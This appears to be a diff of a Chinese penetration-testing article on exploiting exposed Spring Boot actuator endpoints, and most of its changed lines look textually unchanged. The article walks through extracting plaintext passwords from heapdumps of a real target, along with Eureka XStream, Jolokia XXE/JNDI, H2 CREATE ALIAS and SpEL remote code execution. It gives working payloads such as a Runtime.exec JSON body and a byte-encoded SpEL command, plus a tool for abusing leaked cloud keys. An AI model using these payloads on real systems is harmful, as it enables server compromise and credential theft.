@@ -1,5 +1,5 @@
 ---
-version: "辅助快速过滤分析，获得密码明文。成功获取`challengepassword`密码 `*.H......`"
+version: "辅助快速过滤分析，获得密码明文。成功获取`challengepassword`密码 `*.H......`"
 source: "MrWQ/vulnerability-paper"
 ---
 
@@ -50,15 +50,15 @@ source: "MrWQ/vulnerability-paper"
 `spring boot 1.x版本``select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))``spring boot 2.x版本``select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))`
 ```
 
-辅助快速过滤分析，获得密码明文。成功获取`challengepassword`密码 `*.H......`
+辅助快速过滤分析，获得密码明文。成功获取`challengepassword`密码 `*.H......`
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd278ibtLs9b34gj0hBv5OcSsckN4mzX1lrWOE1IZU17yLK4tBIgbI5Mw/640?wx_fmt=jpeg)
 
-但是有点遗憾的是该目标网站并没有找到 `accessKey`、`secreKey`，如果能成功查询出这两个Key就可以利用下面的工具进行命令执行等系列操作，或者使用行云管家对主机进行绑定。
+但是有点遗憾的是该目标网站并没有找到 `accessKey`、`secreKey`，如果能成功查询出这两个Key就可以利用下面的工具进行命令执行等系列操作，或者使用行云管家对主机进行绑定。
 
 ### 1.2 利用工具
 
-工具地址：_https://github.com/iiiusky/alicloud-tools_ 指定 `AK/SK` 查看所有实例信息：
+工具地址：_https://github.com/iiiusky/alicloud-tools_ 指定 `AK/SK` 查看所有实例信息：
 
 ```
 ./AliCloud-Tools  -a xxx -s xxx ecs --list
@@ -77,9 +77,9 @@ source: "MrWQ/vulnerability-paper"
 
 ### 2.1 漏洞原理
 
-（1）`eureka.client.serviceUrl.defaultZone` 属性被设置为恶意的外部 `eureka server URL` 地址。
+（1）`eureka.client.serviceUrl.defaultZone` 属性被设置为恶意的外部 `eureka server URL` 地址。
 
-（2）`refresh` 触发目标机器请求远程`URL`，提前架设的`fake eureka server`就会返回恶意的`payload`。
+（2）`refresh` 触发目标机器请求远程`URL`，提前架设的`fake eureka server`就会返回恶意的`payload`。
 
 （3）目标机器相关依赖解析`payload`，触发`XStream`反序列化，造成`RCE`漏洞。
 
@@ -95,7 +95,7 @@ source: "MrWQ/vulnerability-paper"
 
 ### 2.3 漏洞利用
 
-通常`Eureka`是在`Netflix`上部署，我们利用关键词`netflix`或者 `eureka.client.serviceUrl.defaultZone`在`env`端点泄露的信息中进行搜索。
+通常`Eureka`是在`Netflix`上部署，我们利用关键词`netflix`或者 `eureka.client.serviceUrl.defaultZone`在`env`端点泄露的信息中进行搜索。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdGof9vjagn4lSIOr2GMbL8GOuTxTiampYyLW50ibKmyE0rzQwrvQIOA4A/640?wx_fmt=jpeg)
 
@@ -109,7 +109,7 @@ source: "MrWQ/vulnerability-paper"
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdOBiboNm9aFvLmGrTkzWsKtkXIoWl9Ejs51zP40J3KBuicob66SblcxWg/640?wx_fmt=jpeg)
 
-抓包改变请求方式`GET→POST` ，修改`eureka.client.serviceUrl.defaultZone`属性为启动`eureka server`地址。
+抓包改变请求方式`GET→POST` ，修改`eureka.client.serviceUrl.defaultZone`属性为启动`eureka server`地址。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdU6l8U2qwcQxpumh0mWx6OotCCL4Vy6wXDQUvmqaEeLpGribQEucPTdw/640?wx_fmt=jpeg)
 
@@ -128,11 +128,11 @@ source: "MrWQ/vulnerability-paper"
 0x03 Jolokia 组件漏洞
 -----------------
 
-`Jolokia` 是一个用来访问远程`JMX MBeans`的方法，它可以利用`JSON`通过`Http`实现`JMX`远程管理的开源项目，即允许对所有已经注册的`MBean`进行`Http`访问，具有快速、简单等特点。除了支持基本的`JMX`操作之外，它还提供一些独特的特性来增强`JMX`远程管理如：批量请求，细粒度安全策略等。
+`Jolokia` 是一个用来访问远程`JMX MBeans`的方法，它可以利用`JSON`通过`Http`实现`JMX`远程管理的开源项目，即允许对所有已经注册的`MBean`进行`Http`访问，具有快速、简单等特点。除了支持基本的`JMX`操作之外，它还提供一些独特的特性来增强`JMX`远程管理如：批量请求，细粒度安全策略等。
 
 ### 3.1 漏洞原理
 
-（1）直接访问可触发漏洞的`URL`，相当于通过`jolokia`调用 `ch.qos.logback.classic.jmx.JMXConfigurator`类的`reloadByURL`方法。
+（1）直接访问可触发漏洞的`URL`，相当于通过`jolokia`调用 `ch.qos.logback.classic.jmx.JMXConfigurator`类的`reloadByURL`方法。
 
 （2）目标机器请求外部日志配置文件`URL`地址，获得恶意`xml`文件内容。
 
@@ -154,7 +154,7 @@ source: "MrWQ/vulnerability-paper"
 
 ### 3.3 XXE 漏洞利用
 
-在 `VPS` 上创建 `XXE` 攻击文件，并使用命令`python -m SimpleHTTPServer 8888`开启`web`服务。
+在 `VPS` 上创建 `XXE` 攻击文件，并使用命令`python -m SimpleHTTPServer 8888`开启`web`服务。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdibEJAiaUfibVzicSTFBV4oum9WAyApmDtQRgLVrTEwZHqT1o8Qj90tDtjQ/640?wx_fmt=jpeg)
 
@@ -170,11 +170,11 @@ source: "MrWQ/vulnerability-paper"
 
 ### 3.4 Jolokia Logback JNDI RCE 漏洞利用
 
-首先在 `VPS` 上上传 JNDI[1]，并启动 `JNDI` 服务 `java -jar JNDI-1.0-all.jar`
+首先在 `VPS` 上上传 JNDI[1]，并启动 `JNDI` 服务 `java -jar JNDI-1.0-all.jar`
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd9R1e1QI1yh6gU9KlZClm54aYlIpcxFIf5IUxHVox5TtFiaiaic8WicTD4A/640?wx_fmt=jpeg)
 
-修改 `jolokia-logback.xml` 并上传到 `VPS` 上。
+修改 `jolokia-logback.xml` 并上传到 `VPS` 上。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdiaYPLYT3ia2epBClqplOPCVh3KYFraMkgKvvWEoJfXJreswE3h2ibqOag/640?wx_fmt=jpeg)
 
@@ -188,7 +188,7 @@ source: "MrWQ/vulnerability-paper"
 
   
 
-查看 `JNDI` 的 `config.properties`，可以进行命令执行、文件写入等操作。
+查看 `JNDI` 的 `config.properties`，可以进行命令执行、文件写入等操作。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFdgkeUtSntRpWS2Abc3wiaNfhPtjjlrpwsdiaKGPBMrnlxAUff3QwV17fg/640?wx_fmt=jpeg)
 
@@ -199,7 +199,7 @@ source: "MrWQ/vulnerability-paper"
 
 ### 4.1 漏洞原理
 
-（1）`spring.datasource.hikari.connection-test-query`属性被设置为一条恶意的 `CREATE ALIAS`创建自定义函数的`SQL`语句。
+（1）`spring.datasource.hikari.connection-test-query`属性被设置为一条恶意的 `CREATE ALIAS`创建自定义函数的`SQL`语句。
 
 （2）其属性对应`HikariCP`数据库连接池的`connectionTestQuery`配置，定义一个新数据库连接之前被执行的`SQL`语句。
 
@@ -225,7 +225,7 @@ source: "MrWQ/vulnerability-paper"
 {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');"}
 ```
 
-由于环境是`Spring 2.x`版本还需要修改请求体中的`content-type`字段的值 `application/json`。
+由于环境是`Spring 2.x`版本还需要修改请求体中的`content-type`字段的值 `application/json`。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd0EqmD31lyP0LI1IOVXAfmxPFkOtbnTicdnf02KAFI7hIuzMtghib1uGw/640?wx_fmt=jpeg)
 
@@ -240,11 +240,11 @@ source: "MrWQ/vulnerability-paper"
 
 ### 5.1 漏洞原理
 
-（1）`spring boot`处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中。
+（1）`spring boot`处理参数值出错，流程进入 `org.springframework.util.PropertyPlaceholderHelper` 类中。
 
 （2）此时`URL`中的参数值会用`parseStringValue`方法进行递归解析。
 
-（3）其中 ${} 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的`resolvePlaceholder`方法当作`SpEL`表达式被解析执行，造成`RCE`漏洞。
+（3）其中 ${} 包围的内容都会被 `org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration` 类的`resolvePlaceholder`方法当作`SpEL`表达式被解析执行，造成`RCE`漏洞。
 
 ### 5.2 利用条件
 
@@ -254,11 +254,11 @@ source: "MrWQ/vulnerability-paper"
 
 ### 5.3 漏洞利用
 
-`SpEL`使用 `#{...}` 作为定界符，所有在大括号中的字符都将被认为是`SpEL`表达式，我们可以在其中使用运算符，变量以及引用`bean`，属性和方法。
+`SpEL`使用 `#{...}` 作为定界符，所有在大括号中的字符都将被认为是`SpEL`表达式，我们可以在其中使用运算符，变量以及引用`bean`，属性和方法。
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/4136w7o9JvfS6m21JrNiaN0X9F0HuUPFd2nycMY5ycqRq20wItWzT5zzpv4ic5YQ6H2ed9EdBO7xQHEFa8Q8Acfw/640?wx_fmt=jpeg)
 
-执行 `open -a Calculator` 命令：
+执行 `open -a Calculator` 命令：
 
 ```
 ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))
@@ -273,7 +273,7 @@ ${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x
 
 ### 6.1 区分 Spring 版本
 
-（1）对于 `Spring 1x` ，它们在根`URL`下进行注册，但在`Spring 2x`版本中将此功能移动到`“/actuator/”`的路径下。
+（1）对于 `Spring 1x` ，它们在根`URL`下进行注册，但在`Spring 2x`版本中将此功能移动到`“/actuator/”`的路径下。
 
 （2）`Spring1.X`和`Spring2.X`的`POST`请求数据也存在区别，`Spring1.X`是通过`Content-Type: application/x-www-form-urlencoded`传参，`Spring2.X`是通过`Content-Type: application/json`传参。
 
@@ -289,7 +289,7 @@ _https://www.freebuf.com/column/234719.html_
 
 ### References
 
-`[1]` JNDI: _https://github.com/su18/JNDI_
+`[1]` JNDI: _https://github.com/su18/JNDI_
 
   
 
